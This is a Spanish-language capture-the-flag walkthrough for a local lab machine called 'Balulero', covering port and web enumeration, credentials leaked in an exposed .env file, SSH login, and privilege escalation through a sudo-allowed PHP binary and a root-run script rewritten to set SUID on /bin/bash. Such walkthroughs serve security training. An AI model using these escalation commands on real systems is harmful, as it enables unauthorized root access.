- Tags: #Balulero
---
[Maquina Balulero](https://mega.nz/file/OcEV2BYS#i3eCiO8_0FcRYTzAtYU_XGcLJ59PiTIqTE2Hs5TiboE) -> Enlace de descarga al laboratorio
```bash
7z x balulero.zip # Descomprimimos el laboratorio
sudo bash auto_deploy.sh balulero.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Gracias al ttl determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos y Servicios:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-65000 # Usamos nuestra herramienta para detectar puertos mediante TCP
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos
extractPorts allPorts # Parseamos la informacion mas relevante del escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos deteccion de los servicios y versiones que corren detras de estos puertos.
```

```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) # Tenemos un servicio ssh expuesto
```

**OpenSSH 8.2p1** puede ser vulnerable a ciertas vulnerabilidades. El cliente y el servidor OpenSSH son vulnerables a un ataque de denegación de servicio previo a la autenticación (CVE-2025-26466) que se introdujo en agosto de 2023. Este ataque involucra un consumo asimétrico de recursos de memoria y CPU. 
OpenSSH 8.2p1 también es vulnerable a la vulnerabilidad CVE-2020-12062. Esta vulnerabilidad se encuentra en el cliente scp de OpenSSH y permite a un usuario malicioso en el servidor remoto sobrescribir archivos arbitrarios en el directorio de descargas del cliente.

### Fase Enumeracion Web:
```bash
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu) # Servicio web expuesto ( ubuntuFocal)
http://172.17.0.2/ # Tenemos la direccion URL de la web principal
```

```bash
# Resultado nada relevante
whatweb http://172.17.0.2
nmap --script http-enum -p 80 172.17.0.2
```

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash # Aplicamos reconocimiento de rutas
/whoami/              (Status: 200) [Size: 739] # Directorio encontrado
```

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,js,txt,php.back # Aplicamos reconocimiento de extensiones para archivos

# Resultado
/index.html           (Status: 200) [Size: 9487]
/script.js            (Status: 200) [Size: 2822]
/imagenes.js          (Status: 200) [Size: 398]
```

```bash
/script.js            (Status: 200) [Size: 2822] # Revisando el contenido vemos que hace referencia a una archivo: ( .env_de_baluchingon )
```

```bash
http://172.17.0.2/.env_de_baluchingon # Cuando lo intentamos cargar vemos lo siguiente.

RECOVERY LOGIN # Tenemos credenciales filtradas
balu:balubalulerobalulei
```

### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh balu@172.17.0.2 # Nos logueamos por ssh con exito
```

### Fase Escalada Privilegios:
```bash
drwxr-xr-x 2 chocolate chocolate 4096 May  7  2024 chocolate # Revisando el home tenemos este usuario el cual podemos leeer y acceder a su directorio personal
```

```bash
sudo -l

User balu may run the following commands on 888f56a75f4f:
    (chocolate) NOPASSWD: /usr/bin/php # Tenemos una via potencial de explotar este binario
```

```bash
# Escalaremos al usuario ( chocolate )
balu@888f56a75f4f:/home/chocolate$ CMD="/bin/bash"
balu@888f56a75f4f:/home/chocolate$ sudo -u chocolate /usr/bin/php -r "pcntl_exec('/bin/bash', ['-p']);"
```

**Nota** -> Despues de realizar un enumeramiento exhaustivo del sistema logramos detectar un proceso que se esta ejecutando como usario **root** pero que pertenece al usuario **chocolate** en la ruta: **( /opt/script.php )**
```bash
ps -faux # Listamos los procesos del sistema

# Resultado
root           1  0.0  0.0   2616  1724 ?        Ss   16:23   0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
```

Sabiendo que somos propietarios de este script **( script.php )** lo modificaremos para insertar una instruccion maliciosa que otorgue el permiso SUID a la bash.

```bash
<?php 
    system("chmod u+s /bin/bash"); 
?>
```

```bash
ls -l /bin/bash # Logramos cambiarle los permisos
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```bash
bash -p # Ejeucutamos esta instrucion
```

```bash
bash-5.0# whoami
root # Migramos a root
```